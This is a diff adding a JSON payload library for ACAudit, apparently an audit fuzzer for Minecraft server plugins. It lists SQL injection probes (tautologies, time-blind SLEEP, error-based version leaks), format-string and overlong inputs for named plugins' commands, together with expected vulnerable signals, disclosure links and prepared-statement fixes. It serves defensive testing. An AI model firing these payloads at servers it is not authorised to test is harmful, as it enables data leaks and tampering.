@@ -1,0 +1,178 @@
+{
+  "version": 1,
+  "_comment": "ACAudit plugin-specific payload library. Community-editable: drop an edited copy at config/acaudit/plugin_payloads.json to override/extend this bundled set. See CONTRIBUTING.md for the schema. payload.type = SQLI|FORMAT|LENGTH|SPECIAL. delayMs>0 = time-based (gated). destructive=true = stacked/data-changing (gated). storage tells the fuzzer which payload types can possibly work: FLATFILE plugins have NO SQL surface for the marked commands. These are TARGETED PROBES, not version-verified proof.",
+  "plugins": [
+    {
+      "id": "litebans",
+      "namespaces": ["litebans"],
+      "storage": "MYSQL",
+      "disclosureUrl": "https://gitlab.com/ruany/LiteBans/-/issues",
+      "fixExample": "PreparedStatement ps = c.prepareStatement(\"INSERT INTO litebans_bans(reason) VALUES(?)\"); ps.setString(1, reason);",
+      "commands": [
+        {
+          "template": "ban TestUser123 {x}",
+          "arg": "reason",
+          "surface": "SQL",
+          "notes": "Ban reason is stored in litebans_bans (MySQL/MariaDB/PostgreSQL/SQLite/H2).",
+          "payloads": [
+            {"type": "SQLI", "text": "' OR '1'='1", "destructive": false, "delayMs": 0, "note": "quote breakout", "vulnerableSignal": "SQL syntax error echoed, or ban stored malformed"},
+            {"type": "SQLI", "text": "test'); SELECT SLEEP(5)-- ", "destructive": false, "delayMs": 5000, "note": "MySQL time-blind", "vulnerableSignal": "command confirmation ~5s late"},
+            {"type": "SPECIAL", "text": "reason§kbypass", "destructive": false, "delayMs": 0, "note": "format/section char in stored reason", "vulnerableSignal": "garbled/colored text shown to staff later"}
+          ]
+        },
+        {
+          "template": "warn TestUser123 {x}",
+          "arg": "reason",
+          "surface": "SQL",
+          "notes": "Warn reason stored in litebans_warnings.",
+          "payloads": [
+            {"type": "SQLI", "text": "' AND extractvalue(1,concat(0x7e,version()))-- ", "destructive": false, "delayMs": 0, "note": "MySQL error-based version leak", "vulnerableSignal": "DB version string in an error message"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "advancedban",
+      "namespaces": ["advancedban", "abans"],
+      "storage": "MYSQL",
+      "disclosureUrl": "https://github.com/DevLeoko/AdvancedBan/issues",
+      "fixExample": "Use prepared statements in PunishmentManager; bind the reason parameter rather than concatenating.",
+      "commands": [
+        {
+          "template": "ban TestUser123 {x}",
+          "arg": "reason",
+          "surface": "SQL",
+          "notes": "Reason stored in Punishments/PunishmentHistory (MySQL or SQLite via HikariCP).",
+          "payloads": [
+            {"type": "SQLI", "text": "' OR 1=1-- ", "destructive": false, "delayMs": 0, "note": "tautology", "vulnerableSignal": "SQL error or malformed record"},
+            {"type": "SQLI", "text": "x' AND SLEEP(5)-- ", "destructive": false, "delayMs": 5000, "note": "time-blind", "vulnerableSignal": "~5s delayed response"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "banmanager",
+      "namespaces": ["banmanager", "bm"],
+      "storage": "MYSQL",
+      "disclosureUrl": "https://github.com/BanManagement/BanManager/issues",
+      "fixExample": "BanManager uses an ORM (ORMLite) - keep all reason/note input as bound query args, never raw SQL.",
+      "commands": [
+        {
+          "template": "ban TestUser123 1d {x}",
+          "arg": "reason",
+          "surface": "SQL",
+          "notes": "Reason/notes stored in bm_player_bans / bm_player_notes (MySQL/SQLite/Postgres).",
+          "payloads": [
+            {"type": "SQLI", "text": "'\"`", "destructive": false, "delayMs": 0, "note": "mixed quote probe", "vulnerableSignal": "SQL error"},
+            {"type": "LENGTH", "text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "destructive": false, "delayMs": 0, "note": "overflow a fixed-width reason column", "vulnerableSignal": "truncation error / data too long exception"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cmi",
+      "namespaces": ["cmi"],
+      "storage": "MYSQL",
+      "disclosureUrl": "https://www.zrips.net/cmi/ (support Discord)",
+      "fixExample": "Bind every user-supplied field (money amount, kit name, home name) as a prepared-statement parameter.",
+      "commands": [
+        {
+          "template": "cmi money set TestUser123 {x}",
+          "arg": "amount",
+          "surface": "SQL",
+          "notes": "CMI economy/user data persists to MySQL or SQLite.",
+          "payloads": [
+            {"type": "SQLI", "text": "1 OR 1=1", "destructive": false, "delayMs": 0, "note": "numeric tautology", "vulnerableSignal": "mass balance change or SQL error"},
+            {"type": "FORMAT", "text": "1e9999", "destructive": false, "delayMs": 0, "note": "scientific-notation overflow", "vulnerableSignal": "Infinity/NaN balance"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "auctionhouse",
+      "namespaces": ["auctionhouse", "ah"],
+      "storage": "MIXED",
+      "disclosureUrl": "https://github.com/kiranhart/Auction-House/issues",
+      "fixExample": "Listing search terms and descriptions must be bound parameters in the SQLite/MySQL data layer.",
+      "commands": [
+        {
+          "template": "ah search {x}",
+          "arg": "query",
+          "surface": "SQL",
+          "notes": "Search query may reach a LIKE clause; storage is SQLite/MySQL/MariaDB or flatfile depending on config.",
+          "payloads": [
+            {"type": "SQLI", "text": "%' OR '1'='1", "destructive": false, "delayMs": 0, "note": "LIKE-clause breakout", "vulnerableSignal": "all listings returned / SQL error"},
+            {"type": "SPECIAL", "text": "test§l§c", "destructive": false, "delayMs": 0, "note": "format codes in search/description", "vulnerableSignal": "formatting leaks into the GUI/listing"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "quickshop",
+      "namespaces": ["quickshop", "qs"],
+      "storage": "MYSQL",
+      "disclosureUrl": "https://github.com/Ghost-chu/QuickShop-Hikari/issues",
+      "fixExample": "Shop metadata is in the data table - QuickShop-Hikari uses bound queries; keep any custom benefit/inventory text parameterized.",
+      "commands": [
+        {
+          "template": "qs find {x}",
+          "arg": "item",
+          "surface": "SQL",
+          "notes": "Item/shop lookups hit MySQL/MariaDB/SQLite/H2.",
+          "payloads": [
+            {"type": "SQLI", "text": "' OR 1=1-- ", "destructive": false, "delayMs": 0, "note": "tautology", "vulnerableSignal": "SQL error or unexpected results"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "luckperms",
+      "namespaces": ["luckperms", "lp", "perms", "perm"],
+      "storage": "MIXED",
+      "disclosureUrl": "https://github.com/LuckPerms/LuckPerms/issues",
+      "fixExample": "LuckPerms uses bound statements; permission nodes are validated. Test whether custom meta/prefix values are bound.",
+      "commands": [
+        {
+          "template": "lp user TestUser123 meta set probe {x}",
+          "arg": "value",
+          "surface": "SQL",
+          "notes": "Meta values may persist to the SQL backend when storage=SQL (else flatfile/JSON). Nodes are usually validated.",
+          "payloads": [
+            {"type": "SQLI", "text": "' OR '1'='1", "destructive": false, "delayMs": 0, "note": "quote breakout in meta value", "vulnerableSignal": "SQL error (likely rejected/validated = hardened)"},
+            {"type": "SPECIAL", "text": "value§kobf", "destructive": false, "delayMs": 0, "note": "format char in prefix/meta", "vulnerableSignal": "obfuscated text rendered in chat prefix"}
+          ]
+        }
+      ]
+    },
+    {
+      "id": "essentialsx",
+      "namespaces": ["essentials", "essentialsx", "essx"],
+      "storage": "FLATFILE",
+      "disclosureUrl": "https://github.com/EssentialsX/Essentials/issues",
+      "fixExample": "EssentialsX stores userdata in per-player YAML, not SQL - so the risk class is parsing/format/length & YAML/format-string handling, not SQLi.",
+      "commands": [
+        {
+          "template": "nick {x}",
+          "arg": "nickname",
+          "surface": "DISPLAYED",
+          "notes": "FLATFILE backend: NO SQL surface. Nickname is displayed to other players and stored in YAML - test format/length/special only.",
+          "payloads": [
+            {"type": "SPECIAL", "text": "&k&cobf", "destructive": false, "delayMs": 0, "note": "color/format codes in nick", "vulnerableSignal": "obfuscated/colored nick shown without permission"},
+            {"type": "LENGTH", "text": "NickAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "destructive": false, "delayMs": 0, "note": "over-long nick", "vulnerableSignal": "tablist/chat layout break or YAML write error"},
+            {"type": "FORMAT", "text": "%s%n%x", "destructive": false, "delayMs": 0, "note": "format-string tokens", "vulnerableSignal": "exception or literal token mishandling in a String.format path"}
+          ]
+        },
+        {
+          "template": "pay TestUser123 {x}",
+          "arg": "amount",
+          "surface": "DISPLAYED",
+          "notes": "FLATFILE backend: amount goes through the plugin's number parser (BigDecimal). Test numeric edge cases, not SQLi.",
+          "payloads": [
+            {"type": "FORMAT", "text": "1e9999", "destructive": false, "delayMs": 0, "note": "scientific-notation overflow", "vulnerableSignal": "Infinity balance / parse exception"},
+            {"type": "FORMAT", "text": "9999999999999999999999999999", "destructive": false, "delayMs": 0, "note": "precision/overflow", "vulnerableSignal": "rounding or overflow in balance"}
+          ]
+        }
+      ]
+    }
+  ]
+}
